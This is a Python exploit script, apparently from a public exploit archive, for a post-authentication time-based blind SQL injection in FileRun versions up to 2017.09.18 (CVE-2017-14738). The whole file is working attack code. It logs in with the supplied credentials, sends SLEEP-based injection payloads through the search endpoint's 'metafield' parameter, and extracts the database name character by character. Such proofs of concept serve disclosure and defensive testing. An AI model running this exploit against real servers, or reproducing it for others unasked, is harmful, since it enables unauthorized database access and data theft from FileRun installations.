#!/usr/bin/env python
# Exploit Title: FileRun <=2017.09.18
# Date: September 29, 2017
# Exploit Author: SPARC
# Vendor Homepage: https://www.filerun.com/
# Software Link: http://f.afian.se/wl/?id=EHQhXhXLGaMFU7jI8mYNRN8vWkG9LUVP&recipient=d3d3LmZpbGVydW4uY29t
# Version: 2017.09.18
# Tested on: Ubuntu 16.04.3, Apache 2.4.7, PHP 7.0
# CVE : CVE-2017-14738
# 

import sys,time,urllib,urllib2,cookielib
from time import sleep

print """
#===============================================================#
|                                                               |
|            ___|                   |                           |
|          \___ \  __ \   _ \ __ \  __|  _ \  __| _` |          |
|                | |   |  __/ |   | |    __/ |   (   |          |
|          _____/  .__/ \___|_|  _|\__|\___|_|  \__,_|          |
|                 _|                                            |
|                                                               |
|                   FileRun <= 2017.09.18                       |
|       BlindSQLi Proof of Concept (Post Authentication)        |          
|        by Spentera Research (research[at]spentera.id)         |
|                                                               |
#===============================================================#
"""


host = raw_input("[*] Target IP: ")
username = raw_input("[*] Username: ")
password = raw_input("[*] Password: ")
target = 'http://%s/?module=search&section=ajax&page=grid' %(host)
delay=1
global cookie,data



def masuk(usr,pswd):
    log_data = {
        'username': usr,
        'password': pswd
    }
 
    post_data = urllib.urlencode(log_data)
    cookjar = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookjar))
    try:	
    	req = urllib2.Request('http://%s/?module=fileman&page=login&action=login'%(host), post_data)
    	content = opener.open(req)
    	global data,cookie
    	data = dict((cookie.name, cookie.value) for cookie in cookjar)
    	cookie = ("language=english; FileRunSID=%s"%(data['FileRunSID']))
    	return str(content.read())
    except:                                             
    	print '\n[-] Uh oh! Exploit fail.. PLEASE CHECK YOUR CREDENTIAL'                
    	sys.exit(0)

def konek(m,n):
	#borrow from SQLmap :)
	query=("7) AND (SELECT * FROM (SELECT(SLEEP(%s-(IF(ORD(MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),%s,1))>%s,0,1)))))wSmD) AND (8862=8862" %(delay,m,n))
	values = { 'metafield': query,             
        	   'searchType': 'meta',
        	   'keyword': 'work',
        	   'searchPath': '/ROOT/HOME',
	           'path': '/ROOT/SEARCH' }
	 
	req = urllib2.Request(target, urllib.urlencode(values))                         
	req.add_header('Cookie', cookie)  
	try:                                        
    		starttime=time.time()
    		response = 	urllib2.urlopen(req)
    		endtime = time.time()
    		return int(endtime-starttime)
 
	except:                                             
    		print '\n[-] Uh oh! Exploit fail..'                
    		sys.exit(0)

print "[+] Logging in to the application..."
sleep(1)
cekmasuk = masuk(username,password)
if u'success' in cekmasuk:
	print "[*] Using Time-Based method with %ds delay."%int(delay)
	print "[+] Starting to dump current database. This might take time.."
	sys.stdout.write('[+] Target current database is: ')
	sys.stdout.flush()

	starttime = time.time()
	for m in range(1,256):
		for n in range(32,126):
			wkttunggu = konek(m,n)		
			if (wkttunggu < delay):				
				sys.stdout.write(chr(n))
				sys.stdout.flush()
				break
	endtime = time.time()
	print "\n[+] Done in %d seconds" %int(endtime-starttime)